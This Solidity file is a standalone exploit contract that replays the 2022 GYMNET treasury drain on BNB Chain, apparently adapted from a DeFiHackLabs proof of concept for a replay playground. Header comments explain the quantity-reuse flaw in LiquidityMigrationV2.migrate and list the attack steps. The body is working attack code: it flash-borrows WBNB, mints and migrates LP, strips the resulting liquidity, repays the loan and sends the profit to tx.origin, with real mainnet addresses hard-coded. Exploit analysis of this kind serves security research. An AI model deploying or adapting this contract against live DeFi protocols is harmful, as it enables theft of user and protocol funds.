// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-04-Gym_1).
//
// The DeFiHackLabs PoC (test/Gym_1_exp.sol) runs the attack INLINE in the
// Foundry `ContractTest` — the PancakeSwap flash-swap callback `pancakeCall`
// lives on the test itself (so `address(this)` is the attacker and `tx.origin`
// is the launching EOA). There is no standalone contract to deploy, so the
// playground cannot record it directly. This contract is a faithful,
// self-contained copy of that inline attack (`testExploit` + `pancakeCall` +
// `receive`), so the playground can deploy it and record `run()`. Logic,
// constants, and call ordering are copied verbatim from the registry test.

// VULNERABILITY: GYMNET treasury drain via qty-reuse in LiquidityMigrationV2.migrate (no rate/ownership validation)
// Root cause: migrate() (called by anyone) blindly re-uses the qty of v1 GYM tokens received
//   from burning caller-supplied v1 LP as the amountTokenDesired when calling addLiquidityETH
//   on v2 GYMNET, pulling from the contract's own pre-approved treasury balance of GYMNET and
//   sending the resulting WBNB/GYMNET LP to the arbitrary _msgSender(). See:
//   - sources/LiquidityMigrationV2_1BEfe6/contracts_LpMigration.sol:41 (ctor): IERC20(v2Address).approve(router, type(uint256).max);
//   - sources/.../LpMigration.sol:49: function migrate(uint256 _lpTokens) public nonReentrant
//   - L52: IERC20(lpAddress).transferFrom(_msgSender(), this, _lpTokens)
//   - L53-59: (amountTokenRecived, amountEthRecived) = Router.removeLiquidityETH(v1Address, _lpTokens, 0,0, this, ts)
//   - L63-69: Router.addLiquidityETH{value:amountEthRecived}(v2Address, amountTokenRecived /*<-- v1 qty*/, 0,0, _msgSender(), ts)
//   - also L80-82 withdrawTokens lets owner sweep leftover v1 tokens later.
// Why it works: (1) no ACL on migrate (2) amountTokenRecived from *any* LP (even flash-minted tiny) dictates how much GYMNET treasury to spend (3) no price check, no caller-supplied v2 value, no min-out on GYMNET side, LP titled to caller not protocol (4) Pancake LP add/remove + Gym taxes handled via *SupportingFeeOnTransferTokens (5) migrator holds large GYMNET balance from prior setup.
// Impact: Attacker drains migrator's entire GYMNET balance (protocol funds). In this PoC, flash-swap enables zero-capital attack yielding ~1373 WBNB net after repay. Leftover v1 GYM + dust stays in migrator (owner-recoverable). Breaks the intended v1->v2 LP migration trust.
// Code refs (this file): run() L142, pancakeCall L148- (swaps), L157 (add old LP), L164 (migrate), L165 (remove new LP), L169- (exit swaps/repay).
// EXPLOIT STEPS:
// 1. run(): wbnbBusdPair.swap(2400e18, 0, address(this), new bytes(1)) triggers pancakeCall.
// 2. Swap 600e18 WBNB->GYM(v1) via swapExact...SupportingFeeOnTransferTokens.
// 3. addLiquidity(WBNB, GYM, wbnbBal, gymnetBalOfMigrator [huge], to=this) mints small old LP using our GYM (B) + prop WBNB (A).
// 4. liquidityMigrationV2.migrate( wbnbGymPair.balanceOf(this) ) -- LP to migrator.
// 5. migrate internals: removeLiquidityETH(v1) => v1GYM+WB to migrator; addLiquidityETH(v2, desired=recvd_v1_qty, value=eth, to=this) pulls GYMNET from treasury, sends new LP to this.
// 6. removeLiquidityETHSupportingFeeOnTransferTokens on new LP => extract GYMNET + ETH to attacker.
// 7. deposit ETH to WBNB; swap any residual GYM + received GYMNET -> WBNB.
// 8. repay pair (amount0/9975*10000 +1e4), transfer rest profit to tx.origin.
// 9. net: tx.origin receives the drained value in WBNB.

//

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
}

interface ILiquidityMigrationV2 {
    function migrate(uint256 _lpTokens) external;
}

contract GymDrain {
    // --- mainnet constants (BSC) — copied verbatim from the registry test ---
    address constant ATTACKER = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38; // DefaultSender / tx.origin
    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    ILiquidityMigrationV2 constant liquidityMigrationV2 =
        ILiquidityMigrationV2(payable(0x1BEfe6f3f0E8edd2D4D15Cae97BAEe01E51ea4A4));
    IPancakePair constant wbnbBusdPair = IPancakePair(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);
    IPancakePair constant wbnbGymPair = IPancakePair(0x8dC058bA568f7D992c60DE3427e7d6FC014491dB);
    IPancakePair constant wbnbGymnetPair = IPancakePair(0x627F27705c8C283194ee9A85709f7BD9E38A1663);
    IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 constant gym = IERC20(0xE98D920370d87617eb11476B41BF4BE4C556F3f8);
    IERC20 constant gymnet = IERC20(0x3a0d9d7764FAE860A659eb96A500F1323b411e68);

    constructor() {
        wbnb.approve(address(pancakeRouter), type(uint256).max);
        gym.approve(address(pancakeRouter), type(uint256).max);
        gymnet.approve(address(pancakeRouter), type(uint256).max);
        wbnbGymPair.approve(address(pancakeRouter), type(uint256).max);
        wbnbGymPair.approve(address(liquidityMigrationV2), type(uint256).max);
        wbnbGymnetPair.approve(address(pancakeRouter), type(uint256).max);
    }

    // The recorded entrypoint. Mirrors testExploit(): drain any balance, then
    // flash-borrow 2,400 WBNB from the WBNB/BUSD pair, which calls back into
    // pancakeCall().
    function run() external {
        wbnbBusdPair.swap(2400e18, 0, address(this), new bytes(1));
    }

    // PancakeSwap V2 flash-swap callback — the full inline attack, copied
    // verbatim from ContractTest.pancakeCall (only comments adjusted).
    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) public {
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(gym);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            600e18, 0, path, address(this), type(uint32).max
        );
        // VULNERABILITY (prep): Mint small OLD (WBNB/GYM-v1) LP. amountBDesired set to
        // gymnet bal of migrator (>> our GYM) so we use all our flash-acquired GYM-v1.
        // NOTE: this qty of GYM will be the qty of GYMNET drained in migrate() due to the reuse bug.
        pancakeRouter.addLiquidity(
            address(wbnb),
            address(gym),
            wbnb.balanceOf(address(this)),
            gymnet.balanceOf(address(liquidityMigrationV2)),
            0,
            0,
            address(this),
            type(uint32).max
        );
        // VULNERABILITY: [qty-reuse in migrate] -- the LP bal passed here dictates treasury spend of GYMNET
        // (amountTokenRecived from remove of this LP used directly as desired for v2 token); LP to us, not protocol.
        // VULNERABILITY TRIGGER + DRAIN: migrate(oldLP) causes the protocol's migrate()
        // to spend its GYMNET treasury (qty = oldGYM redeemed) + ETH to create NEW LP
        // that is sent directly to _msgSender() (us).
        liquidityMigrationV2.migrate(wbnbGymPair.balanceOf(address(this)));
        // VULNERABILITY (harvest): extract the GYMNET+WBNB LP we received for free from
        // the migrator's treasury. This is the GYMNET that was paired using the qty from bogus v1 LP.
        pancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(gymnet), wbnbGymnetPair.balanceOf(address(this)), 0, 0, address(this), type(uint32).max
        );
        wbnb.deposit{value: address(this).balance}();
        path[0] = address(gym);
        path[1] = address(wbnb);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            gym.balanceOf(address(this)), 0, path, address(this), type(uint32).max
        );
        path[0] = address(gymnet);
        path[1] = address(wbnb);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            gymnet.balanceOf(address(this)), 0, path, address(this), type(uint32).max
        );
        wbnb.transfer(msg.sender, ((amount0 / 9975) * 10_000) + 10_000);
        wbnb.transfer(tx.origin, wbnb.balanceOf(address(this)));
    }

    receive() external payable {}
}
